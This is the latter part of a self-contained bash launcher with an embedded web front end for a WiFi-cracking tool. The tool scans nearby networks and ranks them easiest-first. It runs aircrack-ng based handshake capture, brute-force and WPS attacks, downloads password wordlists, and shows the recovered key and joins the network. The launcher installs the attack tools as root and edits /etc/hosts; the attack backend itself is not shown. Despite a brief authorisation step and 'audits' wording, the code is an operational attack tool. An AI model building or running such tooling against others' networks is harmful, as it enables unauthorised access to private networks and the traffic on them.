  font-family: var(--mono); font-size: 12px; line-height: 1.7;
}
.log-line { display: flex; gap: 10px; white-space: pre-wrap; word-break: break-word; }
.log-t { color: #4a5563; flex-shrink: 0; }
.log-phase { color: #6b7684; flex-shrink: 0; width: 66px; }
.log-msg { flex: 1; }
.log-info    .log-msg { color: var(--text); }
.log-success .log-msg { color: var(--ok); font-weight: 600; }
.log-warn    .log-msg { color: var(--warn); }
.log-error   .log-msg { color: var(--danger); }

/* Scrollbar */
.console::-webkit-scrollbar { width: 8px; }
.console::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
CRACK_EOF_STYLE

  cat > "${BUNDLE}/web/app.js" <<'CRACK_EOF_APP'
/* crack-wifi.local — front-end logic */
(function () {
  "use strict";

  const $ = (id) => document.getElementById(id);
  const api = {
    status: () => fetch("/api/status").then((r) => r.json()),
    scan: () => fetch("/api/scan").then((r) => r.json()),
    attack: (bssid, options) =>
      fetch("/api/attack", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ bssid, options }),
      }).then((r) => r.json()),
    poll: (id, since) =>
      fetch(`/api/attack?id=${encodeURIComponent(id)}&since=${since}`).then((r) => r.json()),
    stop: (id) =>
      fetch("/api/attack/stop", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ id }),
      }).then((r) => r.json()),
  };

  const state = {
    networks: [],
    selected: null,
    jobId: null,
    since: 0,
    pollTimer: null,
  };

  // -- signal glyph ------------------------------------------------------
  function signalBars(dbm) {
    if (dbm == null) return "····";
    if (dbm >= -55) return "▁▃▅▇";
    if (dbm >= -65) return "▁▃▅ ";
    if (dbm >= -75) return "▁▃  ";
    return "▁   ";
  }

  function lockGlyph(enc) {
    return enc && enc.toUpperCase().startsWith("OPEN") ? "🔓" : "🔒";
  }

  // -- network list ------------------------------------------------------
  function renderNetworks(nets) {
    const list = $("network-list");
    list.innerHTML = "";
    $("net-count").textContent = nets.length ? `${nets.length} found` : "";
    $("scan-hint").classList.toggle("hidden", nets.length > 0);

    nets.forEach((n) => {
      const li = document.createElement("li");
      li.className = "network-item";
      li.dataset.bssid = n.bssid;
      const diff = n.difficulty || { label: "?", score: 0 };
      const diffClass = "diff-" + (diff.label || "").replace(/\s+/g, "");
      const hsBadge = n.has_handshake
        ? `<span class="ni-hs" title="Handshake captured this session">HS ✓</span>` : "";
      li.innerHTML = `
        <span class="ni-signal">${signalBars(n.signal)}</span>
        <span class="ni-main">
          <div class="ni-ssid">${escapeHtml(n.ssid)} <span class="lock">${lockGlyph(n.enc)}</span></div>
          <div class="ni-sub">${escapeHtml(n.enc)} · ch ${n.channel} · ${n.signal != null ? n.signal + " dBm" : "—"}${n.wps ? " · WPS" : ""}</div>
        </span>
        ${hsBadge}
        <span class="ni-diff ${diffClass}">${escapeHtml(diff.label)}</span>`;
      li.addEventListener("click", () => selectNetwork(n));
      list.appendChild(li);
    });
  }

  function markActive(bssid) {
    document.querySelectorAll(".network-item").forEach((el) => {
      el.classList.toggle("active", el.dataset.bssid === bssid);
    });
  }

  // -- detail / difficulty ----------------------------------------------
  function selectNetwork(n) {
    state.selected = n;
    markActive(n.bssid);
    $("detail-empty").classList.add("hidden");
    $("detail").classList.remove("hidden");
    resetAttackUI();

    $("d-ssid").textContent = n.ssid;
    $("d-bssid").textContent = n.bssid;
    $("d-enc").textContent = n.enc;
    $("d-ch").textContent = "ch " + n.channel;
    $("d-signal").textContent = (n.signal != null ? n.signal + " dBm" : "—") + (n.wps ? " · WPS" : "");

    const d = n.difficulty || { score: 0, label: "?", eta: "", reasons: [] };
    animateGauge(d.score);
    $("d-score").textContent = d.score;
    $("d-label").textContent = d.label;
    $("d-eta").textContent = "ETA: " + d.eta;

    const reasons = $("d-reasons");
    reasons.innerHTML = "";
    (d.reasons || []).forEach((r) => {
      const li = document.createElement("li");
      li.textContent = r;
      reasons.appendChild(li);
    });

    // Pre-select a sensible method.
    if (d.method === "wps-pixie") $("opt-method").value = "wps-pixie";
    else $("opt-method").value = "auto";
  }

  function gaugeColor(score) {
    if (score < 30) return "#46d17f";
    if (score < 55) return "#f0b429";
    if (score < 80) return "#ff8f6b";
    return "#ff5c5c";
  }

  function animateGauge(score) {
    const arc = $("gauge-arc");
    const circ = 2 * Math.PI * 52; // ~327
    const offset = circ * (1 - Math.max(0, Math.min(100, score)) / 100);
    arc.style.strokeDashoffset = offset;
    arc.style.stroke = gaugeColor(score);
  }

  // -- attack ------------------------------------------------------------
  function collectOptions() {
    const method = $("opt-method").value;
    const opts = { method };
    opts.connect = $("opt-connect").checked;
    const wl = $("opt-wordlist").value.trim();
    if (wl) opts.wordlist = wl;
    if (method === "handshake+bruteforce") {
      opts.bruteforce = true;
      opts.charset = $("opt-charset").value;
      opts.length = parseInt($("opt-length").value, 10) || 8;
    }
    // pass through some network context for the backend fallback
    if (state.selected) {
      opts.ssid = state.selected.ssid;
      opts.enc = state.selected.enc;
      opts.channel = state.selected.channel;
    }
    return opts;
  }

  async function startAttack() {
    if (!state.selected) return;
    resetAttackUI();
    $("attack-btn").disabled = true;
    $("stop-btn").classList.remove("hidden");
    setPill("running");

    const res = await api.attack(state.selected.bssid, collectOptions());
    if (res.error) {
      logLine({ t: 0, phase: "error", level: "error", msg: res.error });
      finishUI("failed");
      return;
    }
    state.jobId = res.job_id;
    state.since = 0;
    poll();
  }

  function poll() {
    clearTimeout(state.pollTimer);
    api.poll(state.jobId, state.since).then((snap) => {
      if (snap.error) return;
      (snap.events || []).forEach(logLine);
      state.since = snap.total_events;

      updateProgress(snap);

      if (snap.status === "running") {
        state.pollTimer = setTimeout(poll, 350);
      } else {
        finishUI(snap.status);
        if (snap.result) showResult(snap.network, snap.result);
        doScan();   // refresh cached-handshake badges in the list
      }
    }).catch(() => {
      state.pollTimer = setTimeout(poll, 800);
    });
  }

  const PROGRESS_LABELS = {
    crack: "Cracking", capture: "Capturing handshake", download: "Downloading wordlist",
  };

  function updateProgress(snap) {
    const wrap = $("progress-wrap");
    const fill = $("progress-fill");
    const prog = snap.progress;
    if (snap.status === "running" && prog && prog.phase) {
      wrap.classList.remove("hidden");
      $("progress-label").textContent = PROGRESS_LABELS[prog.phase] || "Working";
      fill.classList.toggle("download", prog.phase === "download");
      const pct = typeof prog.pct === "number" ? prog.pct : null;
      if (pct == null) {
        fill.classList.add("indeterminate");
        $("progress-pct").textContent = "";
      } else {
        fill.classList.remove("indeterminate");
        fill.style.width = pct + "%";
        $("progress-pct").textContent = pct + "%";
      }
    } else if (snap.status === "success" && prog) {
      fill.classList.remove("indeterminate");
      fill.style.width = "100%";
      $("progress-pct").textContent = "100%";
      $("progress-label").textContent = "Done";
    }
  }

  async function stopAttack() {
    if (!state.jobId) return;
    await api.stop(state.jobId);
  }

  function finishUI(status) {
    $("attack-btn").disabled = false;
    $("stop-btn").classList.add("hidden");
    setPill(status);
  }

  function showResult(network, result) {
    $("result").classList.remove("hidden");
    $("r-ssid").textContent = (network && network.ssid) || (state.selected && state.selected.ssid) || "";
    $("r-key").textContent = result.key != null ? result.key : "(none — open network)";
    $("r-method").textContent = result.method || "";
    if (result.user) {
      $("r-user-row").classList.remove("hidden");
      $("r-user").textContent = result.user;
    } else {
      $("r-user-row").classList.add("hidden");
    }

    // Connection status.
    const st = $("r-status");
    const cmd = $("r-connect-cmd");
    if (result.connected) {
      st.textContent = "✓ Connected — you are on the network";
      st.className = "result-val ok";
      cmd.classList.add("hidden");
    } else if (result.connect_cmd) {
      st.textContent = "Not connected — run the command below";
      st.className = "result-val warn";
      cmd.textContent = "$ " + result.connect_cmd;
      cmd.classList.remove("hidden");
    } else {
      st.textContent = "—";
      st.className = "result-val";
      cmd.classList.add("hidden");
    }

    $("r-note").textContent = result.note || "";
  }

  // -- console -----------------------------------------------------------
  function logLine(ev) {
    const c = $("console");
    const line = document.createElement("div");
    line.className = "log-line log-" + (ev.level || "info");
    line.innerHTML =
      `<span class="log-t">${(ev.t ?? 0).toFixed(1)}s</span>` +
      `<span class="log-phase">${escapeHtml(ev.phase || "")}</span>` +
      `<span class="log-msg">${escapeHtml(ev.msg || "")}</span>`;
    c.appendChild(line);
    c.scrollTop = c.scrollHeight;
    if (ev.phase) $("phase-tag").textContent = ev.phase;
  }

  function resetAttackUI() {
    clearTimeout(state.pollTimer);
    state.jobId = null;
    state.since = 0;
    $("console").innerHTML = "";
    $("phase-tag").textContent = "";
    $("result").classList.add("hidden");
    $("status-pill").classList.add("hidden");
    $("stop-btn").classList.add("hidden");
    $("attack-btn").disabled = false;
    const wrap = $("progress-wrap");
    wrap.classList.add("hidden");
    const fill = $("progress-fill");
    fill.classList.remove("indeterminate", "download");
    fill.style.width = "0%";
    $("progress-pct").textContent = "";
  }

  function setPill(status) {
    const pill = $("status-pill");
    pill.classList.remove("hidden", "pill-running", "pill-success", "pill-failed", "pill-stopped");
    pill.classList.add("pill-" + status);
    pill.textContent = status;
  }

  // -- scan --------------------------------------------------------------
  let scanning = false;
  async function doScan() {
    if (scanning) return;
    scanning = true;
    $("rescan-btn").classList.add("spinning");
    showScanSkeleton();
    try {
      const res = await api.scan();
      state.networks = res.networks || [];
      // Sort: easiest first (lowest difficulty score).
      state.networks.sort((a, b) => (a.difficulty?.score ?? 100) - (b.difficulty?.score ?? 100));
      renderNetworks(state.networks);
      // Keep the current selection's cached-handshake state in sync.
      if (state.selected) {
        const upd = state.networks.find((n) => n.bssid === state.selected.bssid);
        if (upd) state.selected = upd;
        markActive(state.selected.bssid);
      }
    } catch (e) {
      $("scan-hint").classList.remove("hidden");
      $("scan-hint-title").textContent = "Scan failed — click ↻ to retry.";
    } finally {
      $("rescan-btn").classList.remove("spinning");
      scanning = false;
    }
  }

  function showScanSkeleton() {
    if (state.networks.length) return; // don't blank an existing list on rescan
    $("scan-hint").classList.add("hidden");
    const list = $("network-list");
    list.innerHTML = "";
    for (let i = 0; i < 5; i++) {
      const li = document.createElement("li");
      li.className = "skeleton-item";
      list.appendChild(li);
    }
  }

  // -- util --------------------------------------------------------------
  function escapeHtml(s) {
    return String(s == null ? "" : s)
      .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
  }

  // Curated online wordlists — downloaded on demand by the backend.
  const ONLINE_WORDLISTS = [
    { label: "Top 10k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" },
    { label: "Top 100k passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt" },
    { label: "Top 1M passwords (SecLists)", url: "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt" },
    { label: "rockyou.txt (~14M, large)", url: "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" },
  ];

  function populateWordlists() {
    const sel = $("opt-online-wordlist");
    ONLINE_WORDLISTS.forEach((w) => {
      const o = document.createElement("option");
      o.value = w.url;
      o.textContent = w.label;
      sel.appendChild(o);
    });
  }

  // -- init --------------------------------------------------------------
  function init() {
    populateWordlists();
    $("rescan-btn").addEventListener("click", doScan);
    $("attack-btn").addEventListener("click", startAttack);
    $("stop-btn").addEventListener("click", stopAttack);
    $("opt-online-wordlist").addEventListener("change", (e) => {
      if (e.target.value) $("opt-wordlist").value = e.target.value;
    });

    api.status().then((s) => {
      const badge = $("mode-badge");
      badge.textContent = s.mode;
      badge.className = "badge " + (s.mode === "real" ? "badge-real" : "badge-demo");
      if (s.wordlist) $("opt-wordlist").placeholder = s.wordlist;
    }).catch(() => {});

    // Auto-scan on load — no button required.
    doScan();
  }

  document.addEventListener("DOMContentLoaded", init);
})();
CRACK_EOF_APP

  chmod +x "${BUNDLE}/setup.sh"
  ok "Unpacked backend + web assets to ${BUNDLE}."
}

# Auto-install missing dependencies via the embedded setup.sh (on-board apt) so a
# single command is all the user ever needs. Skipped in demo mode or --skip-setup.
maybe_setup() {
  [[ "$MODE" == "demo" ]] && return 0
  [[ "$SKIP_SETUP" == "1" ]] && return 0

  local missing=()
  for t in python3 iw airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    have "$t" || missing+=("$t")
  done
  have xdg-open || missing+=("xdg-open")   # so the browser can auto-open

  [[ ${#missing[@]} -eq 0 ]] && return 0

  warn "Missing dependencies: ${missing[*]}"
  log  "Running the embedded setup to install them automatically (on-board apt)..."
  if bash "${BUNDLE}/setup.sh"; then
    ok "Setup finished."
  else
    warn "Setup could not install everything — continuing (may fall back to DEMO)."
  fi
}

detect_mode() {
  if [[ "$MODE" == "demo" ]]; then
    ok "Running in ${C_BOLD}DEMO${C_RESET} mode (simulated networks)."
    return
  fi

  local missing=()
  for t in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    have "$t" || missing+=("$t")
  done

  if [[ "$MODE" == "real" ]]; then
    if [[ ${#missing[@]} -gt 0 ]]; then
      err "Real mode requested but still missing tools: ${missing[*]}"
      err "Try:  sudo apt install -y aircrack-ng"
      exit 1
    fi
    if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
      err "Real mode needs root. Re-run with: sudo ./single-script.sh --real"
      exit 1
    fi
    ok "Running in ${C_BOLD}REAL${C_RESET} mode."
    return
  fi

  # auto
  if [[ ${#missing[@]} -eq 0 && "${EUID:-$(id -u)}" -eq 0 ]]; then
    MODE="real"
    ok "aircrack-ng found and running as root -> ${C_BOLD}REAL${C_RESET} mode."
  else
    MODE="demo"
    if [[ ${#missing[@]} -gt 0 ]]; then
      warn "Missing tools (${missing[*]}) -> falling back to ${C_BOLD}DEMO${C_RESET} mode."
    else
      warn "Not running as root -> falling back to ${C_BOLD}DEMO${C_RESET} mode."
    fi
    log "For real audits, run as root (deps auto-install on first run):"
    log "  sudo ./single-script.sh"
  fi
}

# ---------------------------------------------------------------------------
# Local DNS (crack-wifi.local -> 127.0.0.1) via /etc/hosts
# ---------------------------------------------------------------------------
setup_dns() {
  [[ "$MANAGE_DNS" == "1" ]] || { UI_HOST="$BIND_HOST"; return; }

  if [[ ! -w "$HOSTS_FILE" ]]; then
    warn "Cannot write ${HOSTS_FILE} (need root). Using ${BIND_HOST} instead."
    MANAGE_DNS="0"; UI_HOST="$BIND_HOST"; return
  fi

  if grep -q "$HOSTNAME_LOCAL" "$HOSTS_FILE" 2>/dev/null; then
    log "${HOSTNAME_LOCAL} already present in ${HOSTS_FILE}."
  else
    printf '%s\t%s %s\n' "127.0.0.1" "$HOSTNAME_LOCAL" "$HOSTS_MARKER" >> "$HOSTS_FILE"
    ok "Added ${HOSTNAME_LOCAL} -> 127.0.0.1 to ${HOSTS_FILE} (temporary)."
  fi
  UI_HOST="$HOSTNAME_LOCAL"
}

teardown_dns() {
  [[ "$MANAGE_DNS" == "1" ]] || return 0
  [[ -w "$HOSTS_FILE" ]] || return 0
  if grep -q "$HOSTS_MARKER" "$HOSTS_FILE" 2>/dev/null; then
    # Remove only the lines we added.
    local tmp; tmp="$(mktemp)"
    grep -v "$HOSTS_MARKER" "$HOSTS_FILE" > "$tmp" && cat "$tmp" > "$HOSTS_FILE"
    rm -f "$tmp"
    ok "Removed ${HOSTNAME_LOCAL} from ${HOSTS_FILE}."
  fi
}

# ---------------------------------------------------------------------------
# Cleanup on exit
# ---------------------------------------------------------------------------
cleanup() {
  local code=$?
  echo
  step "Cleaning up"
  if [[ -n "$SERVER_PID" ]] && kill -0 "$SERVER_PID" 2>/dev/null; then
    kill "$SERVER_PID" 2>/dev/null || true
    wait "$SERVER_PID" 2>/dev/null || true
    ok "Stopped web server."
  fi
  teardown_dns
  # Best-effort: return any monitor interfaces to managed mode in real mode.
  if [[ "$MODE" == "real" ]] && have airmon-ng; then
    for i in $(iw dev 2>/dev/null | awk '/Interface/{print $2}' | grep -E 'mon$' || true); do
      airmon-ng stop "$i" >/dev/null 2>&1 || true
      ok "Disabled monitor interface $i."
    done
  fi
  # Remove the unpacked bundle.
  if [[ -n "$BUNDLE" && -d "$BUNDLE" ]]; then
    rm -rf "$BUNDLE" 2>/dev/null || true
    ok "Removed temporary files."
  fi
  ok "Done. Stay legal."
  exit "$code"
}
trap cleanup EXIT INT TERM

# ---------------------------------------------------------------------------
# Python backend
# ---------------------------------------------------------------------------
find_python() {
  for p in python3 python; do have "$p" && { echo "$p"; return; }; done
  err "Python 3 is required but not found. Install: sudo apt install -y python3"
  exit 1
}

start_server() {
  local py; py="$(find_python)"
  step "Starting web interface"
  log "mode=${MODE} host=${BIND_HOST} port=${PORT}"

  CRACK_MODE="$MODE" \
  CRACK_WORDLIST="$WORDLIST_DEFAULT" \
  CRACK_WEBROOT="${BUNDLE}/web" \
  "$py" "${BUNDLE}/server/server.py" --host "$BIND_HOST" --port "$PORT" &
  SERVER_PID=$!

  # Wait for the port to come up.
  local tries=0
  until "$py" - "$BIND_HOST" "$PORT" <<'PYEOF' 2>/dev/null
import socket, sys
s = socket.socket(); s.settimeout(0.5)
try:
    s.connect((sys.argv[1], int(sys.argv[2]))); sys.exit(0)
except Exception:
    sys.exit(1)
PYEOF
  do
    tries=$((tries+1))
    if ! kill -0 "$SERVER_PID" 2>/dev/null; then
      err "Web server failed to start."; exit 1
    fi
    [[ $tries -gt 40 ]] && { err "Timed out waiting for web server."; exit 1; }
    sleep 0.25
  done
  ok "Web server is up (pid ${SERVER_PID})."
}

open_browser() {
  [[ "$OPEN_BROWSER" == "1" ]] || return 0
  local url="http://${UI_HOST}:${PORT}"
  local opener=""
  for o in xdg-open sensible-browser x-www-browser firefox firefox-esr chromium google-chrome open; do
    if have "$o"; then opener="$o"; break; fi
  done
  if [[ -n "$opener" ]]; then
    log "Opening your browser (${opener})..."
    ( "$opener" "$url" >/dev/null 2>&1 & )
  else
    warn "Couldn't find a browser to open automatically — click the link below."
  fi
}

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
banner
authorize
step "Preparing self-contained bundle"
extract_bundle
step "Detecting environment"
maybe_setup
detect_mode
setup_dns
start_server
open_browser

URL="http://${UI_HOST}:${PORT}"
printf '\n%b\n' "${C_GRN}${C_BOLD}  Open the interface:  ${URL}${C_RESET}"
printf '%b\n'   "${C_DIM}  (Press Ctrl+C to stop the server and clean up.)${C_RESET}\n"

# Keep the launcher alive until the server dies or the user interrupts.
wait "$SERVER_PID"
